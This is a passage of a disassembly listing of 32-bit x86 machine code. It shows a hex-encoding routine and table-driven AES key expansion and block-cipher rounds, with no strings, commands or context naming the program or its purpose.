  402824:	5b                   	pop    %ebx
  402825:	c2 08 00             	ret    $0x8
  402828:	53                   	push   %ebx
  402829:	56                   	push   %esi
  40282a:	8b 74 24 10          	mov    0x10(%esp),%esi
  40282e:	57                   	push   %edi
  40282f:	8d 3c 75 02 00 00 00 	lea    0x2(,%esi,2),%edi
  402836:	57                   	push   %edi
  402837:	89 7c 24 18          	mov    %edi,0x18(%esp)
  40283b:	e8 39 ff ff ff       	call   0x402779
  402840:	33 db                	xor    %ebx,%ebx
  402842:	8b d0                	mov    %eax,%edx
  402844:	59                   	pop    %ecx
  402845:	85 f6                	test   %esi,%esi
  402847:	7e 33                	jle    0x40287c
  402849:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40284d:	55                   	push   %ebp
  40284e:	8d 6a 01             	lea    0x1(%edx),%ebp
  402851:	0f b6 0c 3b          	movzbl (%ebx,%edi,1),%ecx
  402855:	8b c1                	mov    %ecx,%eax
  402857:	83 e1 0f             	and    $0xf,%ecx
  40285a:	c1 e8 04             	shr    $0x4,%eax
  40285d:	43                   	inc    %ebx
  40285e:	8a 80 4c 19 40 00    	mov    0x40194c(%eax),%al
  402864:	88 45 ff             	mov    %al,-0x1(%ebp)
  402867:	8a 81 4c 19 40 00    	mov    0x40194c(%ecx),%al
  40286d:	88 45 00             	mov    %al,0x0(%ebp)
  402870:	8d 6d 02             	lea    0x2(%ebp),%ebp
  402873:	3b de                	cmp    %esi,%ebx
  402875:	7c da                	jl     0x402851
  402877:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40287b:	5d                   	pop    %ebp
  40287c:	c6 44 3a fe 00       	movb   $0x0,-0x2(%edx,%edi,1)
  402881:	8b c2                	mov    %edx,%eax
  402883:	5f                   	pop    %edi
  402884:	5e                   	pop    %esi
  402885:	5b                   	pop    %ebx
  402886:	c2 08 00             	ret    $0x8
  402889:	68 18 01 00 00       	push   $0x118
  40288e:	6a 00                	push   $0x0
  402890:	ff 74 24 0c          	push   0xc(%esp)
  402894:	e8 ae fd ff ff       	call   0x402647
  402899:	83 c4 0c             	add    $0xc,%esp
  40289c:	c2 04 00             	ret    $0x4
  40289f:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4028a4:	74 0e                	je     0x4028b4
  4028a6:	68 18 01 00 00       	push   $0x118
  4028ab:	ff 74 24 08          	push   0x8(%esp)
  4028af:	e8 e0 0e 00 00       	call   0x403794
  4028b4:	c2 04 00             	ret    $0x4
  4028b7:	83 3d 08 a4 40 00 00 	cmpl   $0x0,0x40a408
  4028be:	75 0f                	jne    0x4028cf
  4028c0:	e8 e5 0e 00 00       	call   0x4037aa
  4028c5:	c7 05 08 a4 40 00 01 	movl   $0x1,0x40a408
  4028cc:	00 00 00 
  4028cf:	53                   	push   %ebx
  4028d0:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4028d4:	8b c3                	mov    %ebx,%eax
  4028d6:	2d 80 00 00 00       	sub    $0x80,%eax
  4028db:	74 2a                	je     0x402907
  4028dd:	83 e8 40             	sub    $0x40,%eax
  4028e0:	74 19                	je     0x4028fb
  4028e2:	83 e8 40             	sub    $0x40,%eax
  4028e5:	74 08                	je     0x4028ef
  4028e7:	6a e0                	push   $0xffffffe0
  4028e9:	58                   	pop    %eax
  4028ea:	e9 32 02 00 00       	jmp    0x402b21
  4028ef:	8b 54 24 08          	mov    0x8(%esp),%edx
  4028f3:	c7 02 0e 00 00 00    	movl   $0xe,(%edx)
  4028f9:	eb 16                	jmp    0x402911
  4028fb:	8b 54 24 08          	mov    0x8(%esp),%edx
  4028ff:	c7 02 0c 00 00 00    	movl   $0xc,(%edx)
  402905:	eb 0a                	jmp    0x402911
  402907:	8b 54 24 08          	mov    0x8(%esp),%edx
  40290b:	c7 02 0a 00 00 00    	movl   $0xa,(%edx)
  402911:	55                   	push   %ebp
  402912:	56                   	push   %esi
  402913:	57                   	push   %edi
  402914:	c1 eb 05             	shr    $0x5,%ebx
  402917:	8d 7a 08             	lea    0x8(%edx),%edi
  40291a:	33 ed                	xor    %ebp,%ebp
  40291c:	89 7a 04             	mov    %edi,0x4(%edx)
  40291f:	85 db                	test   %ebx,%ebx
  402921:	74 36                	je     0x402959
  402923:	8b 74 24 18          	mov    0x18(%esp),%esi
  402927:	8b d5                	mov    %ebp,%edx
  402929:	83 c6 02             	add    $0x2,%esi
  40292c:	0f b6 4e 01          	movzbl 0x1(%esi),%ecx
  402930:	0f b6 06             	movzbl (%esi),%eax
  402933:	8d 76 04             	lea    0x4(%esi),%esi
  402936:	c1 e1 08             	shl    $0x8,%ecx
  402939:	0b c8                	or     %eax,%ecx
  40293b:	0f b6 46 fb          	movzbl -0x5(%esi),%eax
  40293f:	c1 e1 08             	shl    $0x8,%ecx
  402942:	0b c8                	or     %eax,%ecx
  402944:	0f b6 46 fa          	movzbl -0x6(%esi),%eax
  402948:	c1 e1 08             	shl    $0x8,%ecx
  40294b:	0b c8                	or     %eax,%ecx
  40294d:	89 0c 97             	mov    %ecx,(%edi,%edx,4)
  402950:	42                   	inc    %edx
  402951:	3b d3                	cmp    %ebx,%edx
  402953:	72 d7                	jb     0x40292c
  402955:	8b 54 24 14          	mov    0x14(%esp),%edx
  402959:	8b 02                	mov    (%edx),%eax
  40295b:	83 e8 0a             	sub    $0xa,%eax
  40295e:	0f 84 51 01 00 00    	je     0x402ab5
  402964:	48                   	dec    %eax
  402965:	48                   	dec    %eax
  402966:	0f 84 d0 00 00 00    	je     0x402a3c
  40296c:	48                   	dec    %eax
  40296d:	48                   	dec    %eax
  40296e:	0f 85 a8 01 00 00    	jne    0x402b1c
  402974:	8b 5f 1c             	mov    0x1c(%edi),%ebx
  402977:	0f b6 c3             	movzbl %bl,%eax
  40297a:	8b 57 0c             	mov    0xc(%edi),%edx
  40297d:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  402984:	0f b6 47 1f          	movzbl 0x1f(%edi),%eax
  402988:	c1 e1 08             	shl    $0x8,%ecx
  40298b:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402992:	33 c8                	xor    %eax,%ecx
  402994:	0f b6 47 1e          	movzbl 0x1e(%edi),%eax
  402998:	c1 e1 08             	shl    $0x8,%ecx
  40299b:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4029a2:	33 c8                	xor    %eax,%ecx
  4029a4:	0f b6 47 1d          	movzbl 0x1d(%edi),%eax
  4029a8:	c1 e1 08             	shl    $0x8,%ecx
  4029ab:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4029b2:	33 c8                	xor    %eax,%ecx
  4029b4:	8b 47 04             	mov    0x4(%edi),%eax
  4029b7:	33 8d 10 c6 40 00    	xor    0x40c610(%ebp),%ecx
  4029bd:	83 c5 04             	add    $0x4,%ebp
  4029c0:	33 0f                	xor    (%edi),%ecx
  4029c2:	8d 7f 20             	lea    0x20(%edi),%edi
  4029c5:	33 c1                	xor    %ecx,%eax
  4029c7:	89 0f                	mov    %ecx,(%edi)
  4029c9:	8b 4f e8             	mov    -0x18(%edi),%ecx
  4029cc:	33 c8                	xor    %eax,%ecx
  4029ce:	89 47 04             	mov    %eax,0x4(%edi)
  4029d1:	33 d1                	xor    %ecx,%edx
  4029d3:	89 4f 08             	mov    %ecx,0x8(%edi)
  4029d6:	89 57 0c             	mov    %edx,0xc(%edi)
  4029d9:	0f b6 47 0f          	movzbl 0xf(%edi),%eax
  4029dd:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  4029e4:	0f b6 47 0e          	movzbl 0xe(%edi),%eax
  4029e8:	c1 e1 08             	shl    $0x8,%ecx
  4029eb:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4029f2:	33 c8                	xor    %eax,%ecx
  4029f4:	0f b6 47 0d          	movzbl 0xd(%edi),%eax
  4029f8:	c1 e1 08             	shl    $0x8,%ecx
  4029fb:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402a02:	33 c8                	xor    %eax,%ecx
  402a04:	0f b6 c2             	movzbl %dl,%eax
  402a07:	c1 e1 08             	shl    $0x8,%ecx
  402a0a:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402a11:	33 c8                	xor    %eax,%ecx
  402a13:	8b 47 f4             	mov    -0xc(%edi),%eax
  402a16:	33 4f f0             	xor    -0x10(%edi),%ecx
  402a19:	33 c1                	xor    %ecx,%eax
  402a1b:	89 4f 10             	mov    %ecx,0x10(%edi)
  402a1e:	8b 4f f8             	mov    -0x8(%edi),%ecx
  402a21:	33 c8                	xor    %eax,%ecx
  402a23:	89 47 14             	mov    %eax,0x14(%edi)
  402a26:	89 4f 18             	mov    %ecx,0x18(%edi)
  402a29:	33 cb                	xor    %ebx,%ecx
  402a2b:	89 4f 1c             	mov    %ecx,0x1c(%edi)
  402a2e:	83 fd 1c             	cmp    $0x1c,%ebp
  402a31:	0f 82 3d ff ff ff    	jb     0x402974
  402a37:	e9 e0 00 00 00       	jmp    0x402b1c
  402a3c:	8b 5f 14             	mov    0x14(%edi),%ebx
  402a3f:	0f b6 c3             	movzbl %bl,%eax
  402a42:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  402a49:	0f b6 47 17          	movzbl 0x17(%edi),%eax
  402a4d:	c1 e1 08             	shl    $0x8,%ecx
  402a50:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402a57:	33 c8                	xor    %eax,%ecx
  402a59:	0f b6 47 16          	movzbl 0x16(%edi),%eax
  402a5d:	c1 e1 08             	shl    $0x8,%ecx
  402a60:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402a67:	33 c8                	xor    %eax,%ecx
  402a69:	0f b6 47 15          	movzbl 0x15(%edi),%eax
  402a6d:	c1 e1 08             	shl    $0x8,%ecx
  402a70:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402a77:	33 c8                	xor    %eax,%ecx
  402a79:	8b 47 04             	mov    0x4(%edi),%eax
  402a7c:	33 8d 10 c6 40 00    	xor    0x40c610(%ebp),%ecx
  402a82:	83 c5 04             	add    $0x4,%ebp
  402a85:	33 0f                	xor    (%edi),%ecx
  402a87:	8d 7f 18             	lea    0x18(%edi),%edi
  402a8a:	33 c1                	xor    %ecx,%eax
  402a8c:	89 0f                	mov    %ecx,(%edi)
  402a8e:	8b 4f f0             	mov    -0x10(%edi),%ecx
  402a91:	33 c8                	xor    %eax,%ecx
  402a93:	89 47 04             	mov    %eax,0x4(%edi)
  402a96:	8b 47 f4             	mov    -0xc(%edi),%eax
  402a99:	33 c1                	xor    %ecx,%eax
  402a9b:	89 4f 08             	mov    %ecx,0x8(%edi)
  402a9e:	8b 4f f8             	mov    -0x8(%edi),%ecx
  402aa1:	33 c8                	xor    %eax,%ecx
  402aa3:	89 47 0c             	mov    %eax,0xc(%edi)
  402aa6:	89 4f 10             	mov    %ecx,0x10(%edi)
  402aa9:	33 cb                	xor    %ebx,%ecx
  402aab:	89 4f 14             	mov    %ecx,0x14(%edi)
  402aae:	83 fd 20             	cmp    $0x20,%ebp
  402ab1:	72 89                	jb     0x402a3c
  402ab3:	eb 67                	jmp    0x402b1c
  402ab5:	8b 5f 0c             	mov    0xc(%edi),%ebx
  402ab8:	0f b6 c3             	movzbl %bl,%eax
  402abb:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  402ac2:	0f b6 47 0f          	movzbl 0xf(%edi),%eax
  402ac6:	c1 e1 08             	shl    $0x8,%ecx
  402ac9:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402ad0:	33 c8                	xor    %eax,%ecx
  402ad2:	0f b6 47 0e          	movzbl 0xe(%edi),%eax
  402ad6:	c1 e1 08             	shl    $0x8,%ecx
  402ad9:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402ae0:	33 c8                	xor    %eax,%ecx
  402ae2:	0f b6 47 0d          	movzbl 0xd(%edi),%eax
  402ae6:	c1 e1 08             	shl    $0x8,%ecx
  402ae9:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402af0:	33 c8                	xor    %eax,%ecx
  402af2:	8b 47 04             	mov    0x4(%edi),%eax
  402af5:	33 8d 10 c6 40 00    	xor    0x40c610(%ebp),%ecx
  402afb:	83 c5 04             	add    $0x4,%ebp
  402afe:	33 0f                	xor    (%edi),%ecx
  402b00:	8d 7f 10             	lea    0x10(%edi),%edi
  402b03:	33 c1                	xor    %ecx,%eax
  402b05:	89 0f                	mov    %ecx,(%edi)
  402b07:	8b 4f f8             	mov    -0x8(%edi),%ecx
  402b0a:	33 c8                	xor    %eax,%ecx
  402b0c:	89 47 04             	mov    %eax,0x4(%edi)
  402b0f:	89 4f 08             	mov    %ecx,0x8(%edi)
  402b12:	33 cb                	xor    %ebx,%ecx
  402b14:	89 4f 0c             	mov    %ecx,0xc(%edi)
  402b17:	83 fd 28             	cmp    $0x28,%ebp
  402b1a:	72 99                	jb     0x402ab5
  402b1c:	5f                   	pop    %edi
  402b1d:	5e                   	pop    %esi
  402b1e:	33 c0                	xor    %eax,%eax
  402b20:	5d                   	pop    %ebp
  402b21:	5b                   	pop    %ebx
  402b22:	c2 0c 00             	ret    $0xc
  402b25:	81 ec 18 01 00 00    	sub    $0x118,%esp
  402b2b:	8d 04 24             	lea    (%esp),%eax
  402b2e:	53                   	push   %ebx
  402b2f:	56                   	push   %esi
  402b30:	57                   	push   %edi
  402b31:	50                   	push   %eax
  402b32:	e8 52 fd ff ff       	call   0x402889
  402b37:	ff b4 24 30 01 00 00 	push   0x130(%esp)
  402b3e:	8b bc 24 2c 01 00 00 	mov    0x12c(%esp),%edi
  402b45:	8d 44 24 10          	lea    0x10(%esp),%eax
  402b49:	ff b4 24 30 01 00 00 	push   0x130(%esp)
  402b50:	50                   	push   %eax
  402b51:	8d 77 08             	lea    0x8(%edi),%esi
  402b54:	89 77 04             	mov    %esi,0x4(%edi)
  402b57:	e8 5b fd ff ff       	call   0x4028b7
  402b5c:	8b d8                	mov    %eax,%ebx
  402b5e:	85 db                	test   %ebx,%ebx
  402b60:	0f 85 b1 00 00 00    	jne    0x402c17
  402b66:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402b6a:	89 17                	mov    %edx,(%edi)
  402b6c:	c1 e2 04             	shl    $0x4,%edx
  402b6f:	03 54 24 10          	add    0x10(%esp),%edx
  402b73:	6a 04                	push   $0x4
  402b75:	59                   	pop    %ecx
  402b76:	8b 02                	mov    (%edx),%eax
  402b78:	03 d1                	add    %ecx,%edx
  402b7a:	89 06                	mov    %eax,(%esi)
  402b7c:	03 f1                	add    %ecx,%esi
  402b7e:	8b 02                	mov    (%edx),%eax
  402b80:	03 d1                	add    %ecx,%edx
  402b82:	89 06                	mov    %eax,(%esi)
  402b84:	03 f1                	add    %ecx,%esi
  402b86:	8b 02                	mov    (%edx),%eax
  402b88:	03 d1                	add    %ecx,%edx
  402b8a:	89 06                	mov    %eax,(%esi)
  402b8c:	03 f1                	add    %ecx,%esi
  402b8e:	8b 02                	mov    (%edx),%eax
  402b90:	83 ea 1c             	sub    $0x1c,%edx
  402b93:	89 06                	mov    %eax,(%esi)
  402b95:	03 f1                	add    %ecx,%esi
  402b97:	8b 3f                	mov    (%edi),%edi
  402b99:	4f                   	dec    %edi
  402b9a:	85 ff                	test   %edi,%edi
  402b9c:	7e 5f                	jle    0x402bfd
  402b9e:	55                   	push   %ebp
  402b9f:	8b e9                	mov    %ecx,%ebp
  402ba1:	0f b6 42 03          	movzbl 0x3(%edx),%eax
  402ba5:	6a 04                	push   $0x4
  402ba7:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  402bae:	0f b6 42 02          	movzbl 0x2(%edx),%eax
  402bb2:	8b 0c 8d 10 c2 40 00 	mov    0x40c210(,%ecx,4),%ecx
  402bb9:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402bc0:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  402bc7:	0f b6 42 01          	movzbl 0x1(%edx),%eax
  402bcb:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402bd2:	33 0c 85 10 ba 40 00 	xor    0x40ba10(,%eax,4),%ecx
  402bd9:	0f b6 02             	movzbl (%edx),%eax
  402bdc:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  402be3:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  402bea:	89 0e                	mov    %ecx,(%esi)
  402bec:	59                   	pop    %ecx
  402bed:	03 f1                	add    %ecx,%esi
  402bef:	03 d1                	add    %ecx,%edx
  402bf1:	4d                   	dec    %ebp
  402bf2:	75 ad                	jne    0x402ba1
  402bf4:	4f                   	dec    %edi
  402bf5:	83 ea 20             	sub    $0x20,%edx
  402bf8:	85 ff                	test   %edi,%edi
  402bfa:	7f a3                	jg     0x402b9f
  402bfc:	5d                   	pop    %ebp
  402bfd:	8b 02                	mov    (%edx),%eax
  402bff:	89 06                	mov    %eax,(%esi)
  402c01:	03 f1                	add    %ecx,%esi
  402c03:	03 d1                	add    %ecx,%edx
  402c05:	8b 02                	mov    (%edx),%eax
  402c07:	89 06                	mov    %eax,(%esi)
  402c09:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  402c0c:	89 04 0e             	mov    %eax,(%esi,%ecx,1)
  402c0f:	8b 44 0a 04          	mov    0x4(%edx,%ecx,1),%eax
  402c13:	89 44 0e 04          	mov    %eax,0x4(%esi,%ecx,1)
  402c17:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402c1b:	50                   	push   %eax
  402c1c:	e8 7e fc ff ff       	call   0x40289f
  402c21:	5f                   	pop    %edi
  402c22:	5e                   	pop    %esi
  402c23:	8b c3                	mov    %ebx,%eax
  402c25:	5b                   	pop    %ebx
  402c26:	81 c4 18 01 00 00    	add    $0x118,%esp
  402c2c:	c2 0c 00             	ret    $0xc
  402c2f:	55                   	push   %ebp
  402c30:	8b ec                	mov    %esp,%ebp
  402c32:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  402c36:	ff 75 14             	push   0x14(%ebp)
  402c39:	ff 75 10             	push   0x10(%ebp)
  402c3c:	ff 75 08             	push   0x8(%ebp)
  402c3f:	75 07                	jne    0x402c48
  402c41:	e8 0b 00 00 00       	call   0x402c51
  402c46:	eb 05                	jmp    0x402c4d
  402c48:	e8 c6 05 00 00       	call   0x403213
  402c4d:	5d                   	pop    %ebp
  402c4e:	c2 10 00             	ret    $0x10
  402c51:	83 ec 14             	sub    $0x14,%esp
  402c54:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402c58:	53                   	push   %ebx
  402c59:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402c5d:	55                   	push   %ebp
  402c5e:	0f b6 59 03          	movzbl 0x3(%ecx),%ebx
  402c62:	bd ff 00 00 00       	mov    $0xff,%ebp
  402c67:	0f b6 41 02          	movzbl 0x2(%ecx),%eax
  402c6b:	c1 e3 08             	shl    $0x8,%ebx
  402c6e:	0b d8                	or     %eax,%ebx
  402c70:	0f b6 41 01          	movzbl 0x1(%ecx),%eax
  402c74:	c1 e3 08             	shl    $0x8,%ebx
  402c77:	0b d8                	or     %eax,%ebx
  402c79:	0f b6 01             	movzbl (%ecx),%eax
  402c7c:	56                   	push   %esi
  402c7d:	8b 72 04             	mov    0x4(%edx),%esi
  402c80:	57                   	push   %edi
  402c81:	0f b6 79 07          	movzbl 0x7(%ecx),%edi
  402c85:	c1 e7 08             	shl    $0x8,%edi
  402c88:	c1 e3 08             	shl    $0x8,%ebx
  402c8b:	0b d8                	or     %eax,%ebx
  402c8d:	0f b6 41 06          	movzbl 0x6(%ecx),%eax
  402c91:	0b f8                	or     %eax,%edi
  402c93:	33 1e                	xor    (%esi),%ebx
  402c95:	0f b6 41 05          	movzbl 0x5(%ecx),%eax
  402c99:	c1 e7 08             	shl    $0x8,%edi
  402c9c:	0b f8                	or     %eax,%edi
  402c9e:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402ca2:	0f b6 41 04          	movzbl 0x4(%ecx),%eax
  402ca6:	c1 e7 08             	shl    $0x8,%edi
  402ca9:	0b f8                	or     %eax,%edi
  402cab:	0f b6 41 0b          	movzbl 0xb(%ecx),%eax
  402caf:	33 7e 04             	xor    0x4(%esi),%edi
  402cb2:	83 c6 08             	add    $0x8,%esi
  402cb5:	c1 e0 08             	shl    $0x8,%eax
  402cb8:	89 44 24 28          	mov    %eax,0x28(%esp)
  402cbc:	0f b6 41 0a          	movzbl 0xa(%ecx),%eax
  402cc0:	09 44 24 28          	or     %eax,0x28(%esp)
  402cc4:	c1 64 24 28 08       	shll   $0x8,0x28(%esp)
  402cc9:	0f b6 41 09          	movzbl 0x9(%ecx),%eax
  402ccd:	09 44 24 28          	or     %eax,0x28(%esp)
  402cd1:	0f b6 41 08          	movzbl 0x8(%ecx),%eax
  402cd5:	c1 64 24 28 08       	shll   $0x8,0x28(%esp)
  402cda:	09 44 24 28          	or     %eax,0x28(%esp)
  402cde:	8b 44 24 28          	mov    0x28(%esp),%eax
  402ce2:	33 06                	xor    (%esi),%eax
  402ce4:	89 44 24 28          	mov    %eax,0x28(%esp)
  402ce8:	0f b6 41 0f          	movzbl 0xf(%ecx),%eax
  402cec:	c1 e0 08             	shl    $0x8,%eax
  402cef:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402cf3:	0f b6 41 0e          	movzbl 0xe(%ecx),%eax
  402cf7:	09 44 24 2c          	or     %eax,0x2c(%esp)
  402cfb:	c1 64 24 2c 08       	shll   $0x8,0x2c(%esp)
  402d00:	0f b6 41 0d          	movzbl 0xd(%ecx),%eax
  402d04:	09 44 24 2c          	or     %eax,0x2c(%esp)
  402d08:	c1 64 24 2c 08       	shll   $0x8,0x2c(%esp)
  402d0d:	0f b6 41 0c          	movzbl 0xc(%ecx),%eax
  402d11:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402d15:	6a 04                	push   $0x4
  402d17:	89 7c 24 20          	mov    %edi,0x20(%esp)
  402d1b:	0b c8                	or     %eax,%ecx
  402d1d:	8b 02                	mov    (%edx),%eax
  402d1f:	5f                   	pop    %edi
  402d20:	03 f7                	add    %edi,%esi
  402d22:	d1 f8                	sar    $1,%eax
  402d24:	33 0e                	xor    (%esi),%ecx
  402d26:	03 f7                	add    %edi,%esi
  402d28:	48                   	dec    %eax
  402d29:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  402d2d:	89 44 24 20          	mov    %eax,0x20(%esp)
  402d31:	85 c0                	test   %eax,%eax
  402d33:	0f 8e 24 02 00 00    	jle    0x402f5d
  402d39:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402d3d:	8b c2                	mov    %edx,%eax
  402d3f:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402d43:	c1 e8 08             	shr    $0x8,%eax
  402d46:	23 c5                	and    %ebp,%eax
  402d48:	c1 e9 10             	shr    $0x10,%ecx
  402d4b:	23 cd                	and    %ebp,%ecx
  402d4d:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  402d51:	6a 04                	push   $0x4
  402d53:	5f                   	pop    %edi
  402d54:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402d5b:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402d62:	8b c5                	mov    %ebp,%eax
  402d64:	c1 e8 18             	shr    $0x18,%eax
  402d67:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402d6e:	0f b6 c3             	movzbl %bl,%eax
  402d71:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402d78:	33 0e                	xor    (%esi),%ecx
  402d7a:	83 c6 04             	add    $0x4,%esi
  402d7d:	8b 44 24 28          	mov    0x28(%esp),%eax
  402d81:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402d85:	8b cd                	mov    %ebp,%ecx
  402d87:	c1 e8 08             	shr    $0x8,%eax
  402d8a:	25 ff 00 00 00       	and    $0xff,%eax
  402d8f:	c1 e9 10             	shr    $0x10,%ecx
  402d92:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402d98:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402d9f:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402da6:	8b c3                	mov    %ebx,%eax
  402da8:	c1 e8 18             	shr    $0x18,%eax
  402dab:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402db2:	0f b6 c2             	movzbl %dl,%eax
  402db5:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402dbc:	8b c3                	mov    %ebx,%eax
  402dbe:	33 0e                	xor    (%esi),%ecx
  402dc0:	03 f7                	add    %edi,%esi
  402dc2:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  402dc6:	8b cd                	mov    %ebp,%ecx
  402dc8:	c1 e8 10             	shr    $0x10,%eax
  402dcb:	bd ff 00 00 00       	mov    $0xff,%ebp
  402dd0:	23 c5                	and    %ebp,%eax
  402dd2:	c1 e9 08             	shr    $0x8,%ecx
  402dd5:	23 cd                	and    %ebp,%ecx
  402dd7:	8b 1c 8d 10 a9 40 00 	mov    0x40a910(,%ecx,4),%ebx
  402dde:	33 1c 85 10 ad 40 00 	xor    0x40ad10(,%eax,4),%ebx
  402de5:	8b c2                	mov    %edx,%eax
  402de7:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  402deb:	c1 e8 18             	shr    $0x18,%eax
  402dee:	c1 ea 10             	shr    $0x10,%edx
  402df1:	c1 e9 08             	shr    $0x8,%ecx
  402df4:	23 d5                	and    %ebp,%edx
  402df6:	23 cd                	and    %ebp,%ecx
  402df8:	33 1c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ebx
  402dff:	8b 44 24 28          	mov    0x28(%esp),%eax
  402e03:	8b 14 95 10 ad 40 00 	mov    0x40ad10(,%edx,4),%edx
  402e0a:	33 14 8d 10 a9 40 00 	xor    0x40a910(,%ecx,4),%edx
  402e11:	0f b6 c0             	movzbl %al,%eax
  402e14:	33 1c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ebx
  402e1b:	8b 44 24 28          	mov    0x28(%esp),%eax
  402e1f:	33 1e                	xor    (%esi),%ebx
  402e21:	03 f7                	add    %edi,%esi
  402e23:	c1 e8 18             	shr    $0x18,%eax
  402e26:	8b cb                	mov    %ebx,%ecx
  402e28:	c1 e9 10             	shr    $0x10,%ecx
  402e2b:	23 cd                	and    %ebp,%ecx
  402e2d:	33 14 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%edx
  402e34:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402e38:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402e3f:	0f b6 c0             	movzbl %al,%eax
  402e42:	33 14 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%edx
  402e49:	8b 44 24 18          	mov    0x18(%esp),%eax
  402e4d:	33 16                	xor    (%esi),%edx
  402e4f:	03 f7                	add    %edi,%esi
  402e51:	c1 e8 08             	shr    $0x8,%eax
  402e54:	23 c5                	and    %ebp,%eax
  402e56:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402e5d:	8b c2                	mov    %edx,%eax
  402e5f:	c1 e8 18             	shr    $0x18,%eax
  402e62:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402e69:	8b 44 24 14          	mov    0x14(%esp),%eax
  402e6d:	0f b6 c0             	movzbl %al,%eax
  402e70:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402e77:	8b c3                	mov    %ebx,%eax
  402e79:	33 0e                	xor    (%esi),%ecx
  402e7b:	03 f7                	add    %edi,%esi
  402e7d:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  402e81:	8b ca                	mov    %edx,%ecx
  402e83:	c1 e9 10             	shr    $0x10,%ecx
  402e86:	23 cd                	and    %ebp,%ecx
  402e88:	c1 e8 08             	shr    $0x8,%eax
  402e8b:	23 c5                	and    %ebp,%eax
  402e8d:	6a 04                	push   $0x4
  402e8f:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402e96:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402e9d:	8b 44 24 18          	mov    0x18(%esp),%eax
  402ea1:	c1 e8 18             	shr    $0x18,%eax
  402ea4:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402eab:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402eaf:	0f b6 c0             	movzbl %al,%eax
  402eb2:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402eb9:	33 0e                	xor    (%esi),%ecx
  402ebb:	03 f7                	add    %edi,%esi
  402ebd:	8b 44 24 18          	mov    0x18(%esp),%eax
  402ec1:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  402ec5:	8b ca                	mov    %edx,%ecx
  402ec7:	c1 e9 08             	shr    $0x8,%ecx
  402eca:	c1 e8 10             	shr    $0x10,%eax
  402ecd:	23 cd                	and    %ebp,%ecx
  402ecf:	23 c5                	and    %ebp,%eax
  402ed1:	8b 0c 8d 10 a9 40 00 	mov    0x40a910(,%ecx,4),%ecx
  402ed8:	33 0c 85 10 ad 40 00 	xor    0x40ad10(,%eax,4),%ecx
